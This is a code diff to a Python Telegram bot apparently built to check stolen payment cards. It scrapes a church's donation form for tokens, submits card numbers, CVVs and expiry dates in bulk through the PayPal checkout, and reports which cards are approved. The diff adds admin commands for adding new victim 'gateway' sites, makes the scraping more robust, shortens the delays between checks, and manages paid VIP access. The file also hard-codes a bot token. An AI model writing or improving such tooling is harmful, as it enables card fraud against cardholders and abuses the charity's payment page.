@@ -19,10 +19,9 @@ TOKEN = '7834120140:AAHL1Tn-FSgYnyuYeP3jQ-LhfRqMMDHNr9w'
 
 # ------------------- PayPal Gateway Class -------------------
 class PayPal:
-        def __init__(self):
+        def __init__(self, url='https://rhapsody.christembassydallas.org'):
                 self.first_name = ["James", "John", "Robert", "Michael", "William", "David", "Richard", "Joseph", "Thomas", "Charles"]
                 self.last_name = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez"]
-                url = 'https://rhapsody.christembassydallas.org'
                 parsed = urlparse(url)
                 domain = parsed.netloc
                 path = parsed.path
@@ -34,18 +33,27 @@ class PayPal:
                 self.r = requests.Session()
                 self.uu = UserAgent()
 
-
-
         def Key(self):
                 he1 = {
                         'upgrade-insecure-requests': '1',
                         'user-agent': self.uu.random,
                 }
                 r1 = self.r.get(f'https://{self.url}{self.inurl}', headers=he1, )
-                self.id_form1 = re.search(r'name="give-form-id-prefix" value="(.*?)"', r1.text).group(1)
-                self.id_form2 = re.search(r'name="give-form-id" value="(.*?)"', r1.text).group(1)
-                self.nonec = re.search(r'name="give-form-hash" value="(.*?)"', r1.text).group(1)
-                enc = re.search(r'"data-client-token":"(.*?)"',r1.text).group(1)
+                
+                # إصلاح Regex ليكون أكثر مرونة ويمنع أخطاء NoneType
+                f1 = re.search(r'name="give-form-id-prefix" value="(.*?)"', r1.text)
+                f2 = re.search(r'name="give-form-id" value="(.*?)"', r1.text)
+                h1 = re.search(r'name="give-form-hash" value="(.*?)"', r1.text)
+                c1 = re.search(r'"data-client-token":"(.*?)"', r1.text)
+                
+                if not (f1 and f2 and h1 and c1):
+                    raise Exception("Page data not found (Possible protection or change in structure)")
+                
+                self.id_form1 = f1.group(1)
+                self.id_form2 = f2.group(1)
+                self.nonec = h1.group(1)
+                enc = c1.group(1)
+                
                 dec = base64.b64decode(enc).decode('utf-8')
                 self.au = re.search(r'"accessToken":"(.*?)"', dec).group(1)
                 return self.au, self.id_form1, self.id_form2, self.nonec
@@ -303,6 +311,7 @@ ADMINS = [6843321125]  # ضع هنا ID الأدمن
 VIP_USERS = {}  # {user_id: expiration_timestamp}
 BANNED_USERS = {}  # {user_id: True}
 ALL_USERS = set()  # كل مستخدم دخل البوت
+GATEWAYS = ['https://rhapsody.christembassydallas.org']
 stop_users = {}
 last_check_time = {}
 ANTI_SPAM_SECONDS = 7
@@ -311,7 +320,7 @@ user_tasks = {}
 
 # ------------------- Codes -------------------
 
-CODES = {}  # {"WAFA-XXXX-XXXX-XXXX": {"duration":7, "max_users":5, "used":0, "created":timestamp}}
+CODES = {}  # {"WAFA-XXXX-XXXX-XXXX": { ... }}
 
 # ------------------- BIN Lookup -------------------
 
@@ -346,9 +355,9 @@ async def get_bin_info(bin_number):
 
 # ------------------- Check API -------------------
 
-async def check_card_api(card_full):
+async def check_card_api(card_full, gateway_url):
     try:
-        paypal_checker = PayPal()
+        paypal_checker = PayPal(url=gateway_url)
         await asyncio.to_thread(paypal_checker.Key)
         result_raw = await asyncio.to_thread(paypal_checker.Krs, card_full)
         result = result_raw.lower()
@@ -422,8 +431,14 @@ async def process_pp(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not card_full:
         await update.message.reply_text("Usage:\n/pp 4242424242424242|09|28|123")
         return
+    
+    if not GATEWAYS:
+        await update.message.reply_text("❌ No gateways available.")
+        return
+        
     start_time = time.time()
-    status, response = await check_card_api(card_full)
+    # استخدام آخر بوابة تمت إضافتها
+    status, response = await check_card_api(card_full, GATEWAYS[-1])
     taken = round(time.time() - start_time, 2)
     text = await format_response(card_full, status, response, taken)
     await update.message.reply_text(text)
@@ -477,9 +492,13 @@ async def process_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 if not match:
                     return
                 card_full = match[0]
+                
+                if not GATEWAYS:
+                    return
+                    
                 start_time = time.time()
-                status, response = await check_card_api(card_full)
-                await asyncio.sleep(random.uniform(0, 2))
+                status, response = await check_card_api(card_full, GATEWAYS[-1])
+                await asyncio.sleep(random.uniform(0, 1))
                 taken = round(time.time() - start_time, 2)
                 text = await format_response(card_full, status, response, taken)
                 if status == "approved":
@@ -527,14 +546,7 @@ async def process_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 print(f"Loop Error: {e}")
                 continue
 
-        with open(results_file_path, 'w', encoding='utf-8') as result_file:
-            for line in lines:
-                try:
-                    r = await format_response(line.strip(), "N/A", "N/A", 0)
-                    result_file.write(r + "\n\n")
-                except:
-                    continue
-        await update.message.reply_text(f"Done ✅\nResults saved: {results_file_path}")
+        await update.message.reply_text(f"Done ✅")
 
     except Exception as e:
         await update.message.reply_text(f"❌ Error: {e}")
@@ -627,6 +639,62 @@ async def unban_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
     BANNED_USERS.pop(uid, None)
     await update.message.reply_text(f"User {uid} unbanned ✅")
 
+# ------------------- New Admin Commands -------------------
+
+async def add_gateway(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    if user_id not in ADMINS:
+        return await update.message.reply_text("❌ Only admin can add gateways")
+    if not context.args:
+        return await update.message.reply_text("Usage:\n/add URL")
+    url = context.args[0]
+    if not url.startswith("http"): url = "https://" + url
+    if url not in GATEWAYS:
+        GATEWAYS.append(url)
+        await update.message.reply_text(f"✅ Gateway added: {url}")
+    else:
+        await update.message.reply_text("❌ Gateway already exists")
+
+async def remove_gateway(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    if user_id not in ADMINS:
+        return await update.message.reply_text("❌ Only admin can remove gateways")
+    if not GATEWAYS:
+        return await update.message.reply_text("❌ No gateways to remove")
+    gw = GATEWAYS.pop()
+    await update.message.reply_text(f"✅ Gateway removed: {gw}")
+
+async def add_prm(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    if user_id not in ADMINS:
+        return await update.message.reply_text("❌ Only admin can add VIP")
+    if len(context.args) < 2:
+        return await update.message.reply_text("Usage:\n/prm USER_ID DAYS")
+    try:
+        target_id = int(context.args[0])
+        days = int(context.args[1])
+        expiration = int(time.time()) + (days * 86400)
+        VIP_USERS[target_id] = expiration
+        await update.message.reply_text(f"✅ User {target_id} added to VIP for {days} days")
+    except ValueError:
+        await update.message.reply_text("❌ Invalid ID or Days")
+
+async def remove_prm(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    if user_id not in ADMINS:
+        return await update.message.reply_text("❌ Only admin can remove VIP")
+    if not context.args:
+        return await update.message.reply_text("Usage:\n/rmprm USER_ID")
+    try:
+        target_id = int(context.args[0])
+        if target_id in VIP_USERS:
+            del VIP_USERS[target_id]
+            await update.message.reply_text(f"✅ User {target_id} removed from VIP")
+        else:
+            await update.message.reply_text("❌ User not in VIP list")
+    except ValueError:
+        await update.message.reply_text("❌ Invalid ID")
+
 # ------------------- /start -------------------
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -648,6 +716,13 @@ def main():
     app.add_handler(CommandHandler("ban_user", ban_user))
     app.add_handler(CommandHandler("unban_user", unban_user))
     app.add_handler(CommandHandler("try", try_reply))
+    
+    # New Admin Handlers
+    app.add_handler(CommandHandler("add", add_gateway))
+    app.add_handler(CommandHandler("rmadd", remove_gateway))
+    app.add_handler(CommandHandler("prm", add_prm))
+    app.add_handler(CommandHandler("rmprm", remove_prm))
+    
     app.add_handler(MessageHandler(filters.Document.ALL, handle_file))
     app.run_polling()
 
